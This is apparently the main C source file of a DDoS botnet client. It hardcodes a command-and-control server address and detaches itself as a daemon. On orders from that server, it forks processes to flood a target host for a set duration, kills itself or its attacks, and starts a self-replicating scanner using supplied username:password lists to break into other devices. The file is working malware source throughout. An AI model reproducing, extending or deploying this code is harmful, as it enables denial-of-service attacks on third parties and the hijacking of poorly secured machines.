#ifdef DEBUG
#include <stdio.h>
#else
#include <stddef.h>
#endif

#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <linux/types.h>
#include <linux/watchdog.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#endif

#include "headers/main.h"
#include "headers/utils.h"
#include "headers/attacks.h"
#include "headers/scanner.h"

static pid_t gpid = -1;
static pid_t main_pid = -1;

static pid_t **ddos_pids = {NULL};
static uint8_t ddos_pids_count = 0;
static uint8_t ddos_pids_max = 30;// not implemented!!!! use as max running attacks in ddos_add_pid below

typedef struct 
{
    uint8_t octet1;
    uint8_t octet2;
    uint8_t octet3;
    uint8_t octet4;
    uint16_t bot_port;
    uint8_t godbot_build;
} AddressConfig;

typedef struct 
{
    int godbotFD; 
    struct sockaddr_in addr;
} ClientConnection;

typedef struct 
{
    uint32_t local_ip;
    int fd;
    struct sockaddr_in server_addr;
    struct sockaddr_in local_addr;
} LocalAddress;

void load_address(AddressConfig *config) 
{
    #ifdef LOCALCNC
    config->octet1 = 127;
    config->octet2 = 0;
    config->octet3 = 0;
    config->octet4 = 1;
    config->bot_port = 16;
    config->godbot_build = 8;
    return;
    #endif
    config->octet1 = 194;
    config->octet2 = 180;
    config->octet3 = 48;
    config->octet4 = 69;
    config->bot_port = 16;
    config->godbot_build = 0;
}

int initialize_client_connection(ClientConnection *connection, AddressConfig *config) 
{
    connection->addr.sin_family = AF_INET;
    connection->addr.sin_addr.s_addr = htonl((config->octet1 << 24) | (config->octet2 << 16) | (config->octet3 << 8) | config->octet4);
    connection->addr.sin_port = htons(config->bot_port);

    connection->godbotFD = socket_(AF_INET, SOCK_STREAM, 0);
    if (connection->godbotFD == -1) 
    {
        return 0;
    }

    int flags = fcntl(connection->godbotFD, F_GETFL, 0);
    if (flags == -1) 
    {
        return 0;
    }
    flags |= O_NONBLOCK;
    if (fcntl(connection->godbotFD, F_SETFL, flags) == -1) 
    {
        return 0;
    }

    int rc = connect_(connection->godbotFD, (struct sockaddr *)&connection->addr, sizeof(connection->addr));

    if (rc == 0) 
    {
        fd_set write_set;
        FD_ZERO(&write_set);
        FD_SET(connection->godbotFD, &write_set);
        struct timeval tv;
        tv.tv_sec = 15;
        tv.tv_usec = 0;
        if (select(connection->godbotFD + 1, NULL, &write_set, NULL, &tv) > 0) 
        {
            socklen_t lon = sizeof(int);
            int valopt;
            getsockopt(connection->godbotFD, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
            if (valopt) 
            {
                close(connection->godbotFD);
                return 0;
            } 
            else 
            {
                flags = fcntl(connection->godbotFD, F_GETFL, NULL);
                flags &= (~O_NONBLOCK);
                fcntl(connection->godbotFD, F_SETFL, flags);
                return connection->godbotFD;
            }
        } 
        else 
        {
            close(connection->godbotFD);
            return 0;
        }
    } 
    else if(rc > 0) 
    {
        flags = fcntl(connection->godbotFD, F_GETFL, NULL);
        flags &= (~O_NONBLOCK);
        fcntl(connection->godbotFD, F_SETFL, flags);
        return connection->godbotFD;
    }
    else
    {
        close(connection->godbotFD);
        return 0;
    }
}

uint32_t request_local_address(LocalAddress *local_addr) 
{
    local_addr->fd = socket_(AF_INET, SOCK_DGRAM, 0);
    if (local_addr->fd == -1) 
    {
        return 0;
    }

    util_zero(&local_addr->server_addr, sizeof(local_addr->server_addr));

    local_addr->server_addr.sin_family = AF_INET;
    local_addr->server_addr.sin_port = htons(53);
    
    inet_pton(AF_INET, "8.8.8.8", &local_addr->server_addr.sin_addr);

    if (connect_(local_addr->fd, (struct sockaddr *)&local_addr->server_addr, sizeof(local_addr->server_addr)) == -1) 
    {
        close(local_addr->fd);
        return 0;
    }

    util_zero(&local_addr->local_addr, sizeof(local_addr->local_addr));
    socklen_t addr_len = sizeof(local_addr->local_addr);

    if (getsockname(local_addr->fd, (struct sockaddr *)&local_addr->local_addr, &addr_len) == -1) 
    {
        close(local_addr->fd);
        return 0;
    }

    uint32_t local_ip = local_addr->local_addr.sin_addr.s_addr;
    close(local_addr->fd);

    return local_ip;
}

static void ddos_add_pid(pid_t pid)
{
    ddos_pids = realloc(ddos_pids, (ddos_pids_count+1)*sizeof(pid_t *));
    ddos_pids[ddos_pids_count] = malloc(sizeof(pid_t));
    util_zero(ddos_pids[ddos_pids_count], sizeof(pid_t));
    *(ddos_pids[ddos_pids_count]) = pid;
    ddos_pids_count++;
}

static void ddos_kill_pid(pid_t pid)
{
    uint8_t pos = 0;
    for(pos = 0; pos < ddos_pids_count; pos++)
    {
        if(*(ddos_pids[pos]) == pid)
        {
            int status;
            #ifdef _WIN32
            HANDLE w = WaitForSingleObject(ddos_pids[pos], 0);
            if(w == WAIT_FAILED || w == WAIT_TIMEOUT) // process had error or stopped
            {
                TerminateProcess(pid, 9);// kill that hoe
            }
            #else
            pid_t w = waitpid(*(ddos_pids[pos]), &status, WUNTRACED | WCONTINUED | WNOHANG);
            if(w == 0)// process had error or stopped
            {
                kill(pid, 9);// kill that hoe
            }
            #endif
            
            util_zero(ddos_pids[pos], sizeof(pid_t));
            free(ddos_pids[pos]);
            ddos_pids[pos] = NULL;
            
            uint8_t j = 0;
            for(j = pos; j < (ddos_pids_count-1); j++)
            {
                ddos_pids[j] = ddos_pids[j+1];
            }
            
            if(ddos_pids_count != 1)
            {
                ddos_pids = realloc(ddos_pids, (ddos_pids_count-1)*sizeof(pid_t *));
            }
            else
            {
                util_zero(ddos_pids, 1*sizeof(pid_t));
                free(ddos_pids);
                ddos_pids = NULL;
            }
            
            ddos_pids_count--;
        }
    }
}

static void ddos_kill_allpids()
{
    uint8_t pos = 0;
    for(pos = 0; pos < ddos_pids_count; pos++)
    {
        ddos_kill_pid(*(ddos_pids[pos]));
    }
}

static void ddos_clean_pids(void)
{
    uint8_t pos = 0;
    for(pos = 0; pos < ddos_pids_count; pos++)
    {
        int status;
        #ifdef _WIN32
        HANDLE w = WaitForSingleObject(ddos_pids[pos], 0);
        if(w == WAIT_FAILED || w == WAIT_TIMEOUT) // process had error or stopped
        {
            TerminateProcess(*(ddos_pids[pos]), 9);
        }
        #else
        pid_t w = waitpid(*(ddos_pids[pos]), &status, WUNTRACED | WCONTINUED | WNOHANG);
        if(w != 0)// process had error or stopped
        {
            ddos_kill_pid(*(ddos_pids[pos]));
        }
        #endif
    }
}

void process_command(uint8_t* buffer, int buffer_size) 
{
    uint8_t command = *(buffer+0);
    if (command == 0x00 && buffer_size >= 12) 
    {
        unsigned char methodid = *((buffer+1));
        uint32_t target = *((uint32_t*)(buffer+2));
        uint16_t port = *((uint16_t*)(buffer+6));
        uint32_t duration = *((uint32_t*)(buffer+8));

        AttackParams* attackData = malloc(sizeof(AttackParams));
        util_zero(attackData, sizeof(AttackParams));
        attackData->method = methodid;
        attackData->address = target;
        attackData->dport = port;
        attackData->duration = ntohl(duration);

        #ifdef DEBUG
        printf("Starting attack on host %d.%d.%d.%d : %d | METHOD %d | DURATION: %d \r\n", attackData->address & 0xff, (attackData->address >> 8) & 0xff, (attackData->address >> 16) & 0xff, (attackData->address >> 24) & 0xff, ntohs(attackData->dport), attackData->method, attackData->duration);
        #endif

        ddos_clean_pids();
        #ifdef _WIN32
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        if (!CreateProcess(NULL, "ddos_start_attack", NULL, NULL, FALSE, 0, (LPVOID) attackData, NULL, &si, &pi))
        {
            debug_print("Error creating process!\r\n");
            free(attackData);
            return;
        }
        ddos_add_pid(pi.dwProcessId);
        #else
        pid_t pid = 0;
        if((pid = fork()) == 0)
        {
            ddos_start_attack(attackData);
            exit(0);
            kill(getpid(), 9);
        }
        free(attackData);
        ddos_add_pid(pid);
        #endif
            
    }
    else if (command == 0x01) 
    {
        debug_print("[botpkt] Committing Suicide\n");

        #ifdef _WIN32
        if (gpid != -1) 
        {
            TerminateProcess(-gpid, 9);
        }

        if (main_pid != -1) 
        {
            TerminateProcess(main_pid, 9);
        }
        #else
        if (gpid != -1) 
        {
            kill(-gpid, 9);
        }

        if (main_pid != -1) 
        {
            kill(main_pid, 9);
        }
        #endif

        exit(0);
    }
    else if (command == 0x02) 
    {
        debug_print("[botpkt] Killing all running attacks!\n");

        ddos_kill_allpids();
    }
    else if(command == 0x33 && buffer_size > 1) // selfrep cmd
    {
        if(buffer[1] == 0x01)// start selfrep
        {
            if(buffer_size > 2)
            {
                
                int scanner_payload_len = buffer_size-2;
                unsigned char *scanner_payload = buffer+2;
                int argc = 0;
                unsigned char **argv = (unsigned char **)util_tokenize(scanner_payload, scanner_payload_len, &argc, 0xff);
                if(argc >= 1 && argv != NULL)
                {
                    scanner_kill();
                    scanner_clear_auth_entry();
                    int i, found_entries = 0;
                    for(i = 0; i < argc; i++)
                    {
                        unsigned char *entry = argv[i];
                        if(entry[0] == 0) continue;
                        int entry_tokens_count = 0;
                        unsigned char **entry_tokens = util_tokenize((unsigned char *)entry, util_strlen(entry), &entry_tokens_count, ':');
                        if(entry_tokens_count > 0 && entry_tokens != NULL)
                        {
                            if(entry_tokens_count == 2)
                            {
                                scanner_add_auth_entry(entry_tokens[0], entry_tokens[1]);
                                found_entries++;
                            }

                            int j;
                            for (j = 0; j < entry_tokens_count; j++)
                            {
                                free(entry_tokens[j]);
                                entry_tokens[j] = NULL;
                            }
                            free(entry_tokens);
                            entry_tokens = NULL;
                        }
                    }
                    if(found_entries > 0)
                    {
                        scanner_init();// start scanner with new credentials
                    }
                }
                
                if(argv != NULL)
                {
                    int x;
                    for(x = 0; x < argc; x++)
                    {
                        free(argv[x]);
                        argv[x] = NULL;
                    }
                    free(argv);
                    argv = NULL;
                }
            }
            else
            {
                scanner_init();//start scanner without credentials
            }
        }
        if(buffer[1] == 0x02)// stop selfrep
        {
            
            scanner_kill();
        }
    }
    return;
}

unsigned char send_build_request(ClientConnection *connection, AddressConfig *config, unsigned char *bot_id)
{
    if ((connection->godbotFD = initialize_client_connection(connection, config)) == 0)
    {
        debug_print("[ERROR] unable to connect to cnc...\n");
        return 0;
    }

    unsigned char *message = malloc(512);
    util_zero(message, 512);
    util_cpy(message, "\x55", 1);
    util_cpy(message+1, bot_id, util_strlen(bot_id));
    if(write_(connection->godbotFD, message, 1+util_strlen(bot_id)) != 1+util_strlen(bot_id))
    {
        debug_print("Error sending to cnc!\r\n");
        free(message);
        return 0;
    }
    debug_print("connection initialized to cnc!\r\n");
    free(message);
    return 1;
}

int main(int argc, unsigned char **argv)
{
    int x;
    pid_t pid = getpid();
    unsigned char bot_id[256];
    util_zero(bot_id, 256);
    AddressConfig config;
    LocalAddress local_addr;
    ClientConnection connection;
    

    if (argc < 2)
    {
        util_cpy(bot_id, argv[0], util_strlen(argv[0]));
    }
    else
    {
        util_cpy(bot_id, argv[1], util_strlen(argv[1]));
    }


    for (x = 0; x < argc; x++)
    {
        util_zero(argv[x], util_strlen(argv[x]));
    }

    #ifdef DEBUG
    printf("Bot ID: %s\r\n", bot_id);
    #endif

#ifndef DEBUG
    if (fork() > 0)
    {
        return 0;
    }

    pid_t sid;
    sid = setsid();
    if (fork() > 0)
    {
        return 0;
    }
#endif

    attack_init();
    load_address(&config);

    while (1)
    {
        if(send_build_request(&connection, &config, bot_id) == 0)
        {
            sleep(3);
            continue;
        }

        #ifdef DEBUG
        printf("CNC CONNECTED! waiting for command....\r\n");
        #endif

        uint8_t retries = 0;

        while(1) 
        {
            uint8_t buf[4096];
            util_zero(buf, 4096);
            ssize_t count = 0;
            while((count = read_(connection.godbotFD, buf, sizeof(buf) - 1)) > 0)
            {
                #ifdef DEBUG
                printf("Got command (%d) from cnc of %d bytes\r\n", buf[0], count);
                #endif
                printf("{%s}\r\n", buf);
                process_command(buf, count);
                util_zero(buf, sizeof(buf));
                sleep(2);
                continue;
            }

            #ifdef _WIN32
            if(WSAGetLastError() != WSAEWOULDBLOCK)
            #else
            if(errno != EAGAIN && errno != EWOULDBLOCK)
            #endif
            {
                debug_print("Error receiving from cnc!\r\n");
                break;
            }

            if(retries > 10)
            {
                debug_print("CNC connection timed out!\r\n");
                break;
            }

            retries ++;
            continue;
        }
    }

    close(connection.godbotFD);
    return 0;
}
